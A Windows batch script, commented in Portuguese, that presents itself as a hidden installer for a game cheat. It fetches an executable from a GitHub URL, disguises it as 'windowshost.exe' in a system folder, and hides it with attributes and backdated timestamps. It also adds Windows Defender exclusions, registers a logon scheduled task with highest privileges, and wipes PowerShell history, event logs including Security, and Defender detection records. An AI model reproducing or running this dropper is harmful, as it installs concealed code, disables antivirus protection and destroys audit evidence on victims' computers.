@echo off
:: ========================================
::  INSTALADOR AUTOMATICO ZERØ - WINDOWS 10
::  Instala o cheat de forma oculta
:: ========================================

:: Verificar se é Windows 10
ver | findstr /i "10.0" >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERRO] Este programa requer Windows 10!
    pause
    exit /b 1
)

:: Verificar privilégios admin
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERRO] Este script precisa ser executado como Administrador!
    pause
    exit /b 1
)

:: URL do executável no GitHub
set "GITHUB_URL=https://raw.githubusercontent.com/V3xDev/unknow2/main/Rocket.exe"

:: Diretório de instalação oculta
set "INSTALL_DIR=%LOCALAPPDATA%\Microsoft\WindowsApps"

:: Criar diretório se não existir
if not exist "%INSTALL_DIR%" (
    mkdir "%INSTALL_DIR%" >nul 2>&1
)

:: Nome totalmente genérico sem números (parece componente do Windows)
set "EXE_NAME=windowshost.exe"
set "INSTALL_PATH=%INSTALL_DIR%\%EXE_NAME%"

:: Remover arquivo antigo se existir
if exist "%INSTALL_PATH%" (
    del /f /q "%INSTALL_PATH%" >nul 2>&1
)

:: Aguardar um pouco
timeout /t 1 /nobreak >nul 2>&1

:: Baixar usando certutil (método 1)
certutil -urlcache -split -f "%GITHUB_URL%" "%INSTALL_PATH%" >nul 2>&1

:: Verificar se o download foi bem-sucedido
if not exist "%INSTALL_PATH%" (
    :: Se falhar, tentar PowerShell (método 2)
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri '%GITHUB_URL%' -OutFile '%INSTALL_PATH%' -UseBasicParsing -ErrorAction Stop } catch { exit 1 }" >nul 2>&1
    
    :: Verificar novamente
    if not exist "%INSTALL_PATH%" (
        :: Se ainda falhar, tentar BitsAdmin (método 3)
        bitsadmin /transfer "Download" /download /priority high "%GITHUB_URL%" "%INSTALL_PATH%" >nul 2>&1
        
        :: Verificar novamente
        if not exist "%INSTALL_PATH%" (
            echo [ERRO] Falha ao baixar executavel do GitHub!
            pause
            exit /b 1
        )
    )
)

:: Verificar se o arquivo foi baixado com sucesso
if not exist "%INSTALL_PATH%" (
    echo [ERRO] Arquivo nao foi baixado corretamente!
    pause
    exit /b 1
)

:: Verificar se o arquivo tem tamanho válido (mais de 1KB)
for %%A in ("%INSTALL_PATH%") do set "FILE_SIZE=%%~zA"
if %FILE_SIZE% LSS 1024 (
    echo [ERRO] Arquivo baixado parece estar corrompido!
    del /f /q "%INSTALL_PATH%" >nul 2>&1
    pause
    exit /b 1
)

:: ========================================
:: OCULTAÇÃO AVANÇADA - MÚLTIPLAS CAMADAS
:: ========================================

:: Camada 1: Atributos Sistema + Oculto (básico)
attrib +s +h "%INSTALL_PATH%" >nul 2>&1

:: Camada 2: Ocultar de buscas do Windows (não indexar)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$f = '%INSTALL_PATH%'; if (Test-Path $f) { $file = Get-Item $f; $file.Attributes = $file.Attributes -bor [System.IO.FileAttributes]::NotContentIndexed }" >nul 2>&1

:: Camada 3: Definir data de modificação antiga (parece arquivo do sistema)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$f = '%INSTALL_PATH%'; if (Test-Path $f) { $file = Get-Item $f; $file.LastWriteTime = (Get-Date).AddYears(-2); $file.CreationTime = (Get-Date).AddYears(-2) }" >nul 2>&1

:: Camada 4: Remover de histórico de arquivos recentes
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs' -Name '*windowshost*' -ErrorAction SilentlyContinue" >nul 2>&1

:: Camada 5: Ocultar do índice de pesquisa do Windows
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -ErrorAction SilentlyContinue" >nul 2>&1

:: Adicionar exceção no Windows Defender
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Add-MpPreference -ExclusionPath '%INSTALL_PATH%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -ErrorAction SilentlyContinue } catch { }" >nul 2>&1

:: Criar scheduled task para execução automática no logon
set "TASK_NAME=Microsoft\Windows\WindowsApps"
set "TASK_DESCRIPTION=Componente de Host de Aplicativos do Windows"

:: Verificar se o arquivo existe antes de criar a tarefa
if not exist "%INSTALL_PATH%" (
    echo [ERRO] Arquivo nao encontrado: %INSTALL_PATH%
    pause
    exit /b 1
)

:: Remover tarefa existente (se houver)
schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1

:: Aguardar um pouco para garantir que a exclusão foi processada
timeout /t 2 /nobreak >nul 2>&1

:: Criar nova tarefa usando PowerShell (com privilégios elevados)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$action = New-ScheduledTaskAction -Execute '%INSTALL_PATH%'; $trigger = New-ScheduledTaskTrigger -AtLogOn; $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest; $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false -ExecutionTimeLimit ([TimeSpan]::Zero) -MultipleInstances IgnoreNew; Register-ScheduledTask -TaskName '%TASK_NAME%' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description '%TASK_DESCRIPTION%' -Force | Out-Null" >nul 2>&1

:: Verificar se PowerShell funcionou
schtasks /query /tn "%TASK_NAME%" >nul 2>&1
if %errorLevel% neq 0 (
    :: Se PowerShell falhar, usar schtasks como fallback
    schtasks /create /tn "%TASK_NAME%" /tr "\"%INSTALL_PATH%\"" /sc onlogon /ru "%USERNAME%" /rl HIGHEST /f >nul 2>&1
    
    :: Verificar novamente
    schtasks /query /tn "%TASK_NAME%" >nul 2>&1
    if %errorLevel% neq 0 (
        :: Tentar criar via SYSTEM (pode precisar de privilégios)
        schtasks /create /tn "%TASK_NAME%" /tr "\"%INSTALL_PATH%\"" /sc onlogon /ru SYSTEM /rl HIGHEST /f >nul 2>&1
    )
)

:: Limpar rastros de instalação

:: Limpar cache do certutil (remove histórico de downloads)
certutil -urlcache * delete >nul 2>&1

:: Limpar histórico do PowerShell (remove comandos executados)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Clear-History -ErrorAction SilentlyContinue; Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue" >nul 2>&1

:: Limpar arquivos temporários relacionados
del /q /f "%TEMP%\install.bat" >nul 2>&1
del /q /f "%TEMP%\*.tmp" >nul 2>&1
del /q /f "%TEMP%\*install*" >nul 2>&1
del /q /f "%TEMP%\*download*" >nul 2>&1

:: Limpar histórico de arquivos recentes do Windows
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs' -Name '*install*' -ErrorAction SilentlyContinue; Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs' -Name '*download*' -ErrorAction SilentlyContinue" >nul 2>&1

:: Limpar TODOS os logs do Windows 10 relacionados à instalação
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$logs = @('Microsoft-Windows-Eventlog/Operational', 'Application', 'System', 'Security', 'Setup', 'Microsoft-Windows-PowerShell/Operational', 'Microsoft-Windows-Windows Defender/Operational', 'Microsoft-Windows-Security-Auditing', 'Microsoft-Windows-TaskScheduler/Operational', 'Microsoft-Windows-Bits-Client/Operational', 'Microsoft-Windows-Diagnostics-Performance/Operational', 'Microsoft-Windows-Kernel-PnP/Configuration', 'Microsoft-Windows-WinRM/Operational', 'Microsoft-Windows-WindowsUpdateClient/Operational'); foreach ($log in $logs) { wevtutil cl $log /quiet 2>$null }; wevtutil cl 'Microsoft-Windows-Eventlog/Operational' /quiet 2>$null" >nul 2>&1

:: Limpar histórico de quarentena do Defender
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Get-MpThreatDetection | Remove-MpThreatDetection -ErrorAction SilentlyContinue" >nul 2>&1

:: Limpar cache do certutil, bitsadmin, PowerShell
certutil -urlcache * delete >nul 2>&1
bitsadmin /reset /allusers >nul 2>&1

exit
